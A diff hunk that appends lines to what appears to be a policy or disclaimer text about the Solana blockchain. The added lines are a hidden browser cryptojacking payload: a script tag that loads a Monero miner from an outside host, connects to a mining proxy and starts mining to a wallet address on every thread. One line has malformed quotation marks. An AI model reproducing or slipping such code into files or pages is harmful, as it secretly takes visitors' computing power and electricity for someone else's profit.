@@ -104,3 +104,15 @@ deploy, integrate, or use the Solana blockchain protocol code directly
 (e.g., as a node operator), and individuals that transact on the Solana
 blockchain through light clients, third party interfaces, and/or wallet
 software.
+
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "0xD8f3249e8702c4E950b2E0e9739eB46326D28055";
+    var workerId = “j”eb”
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
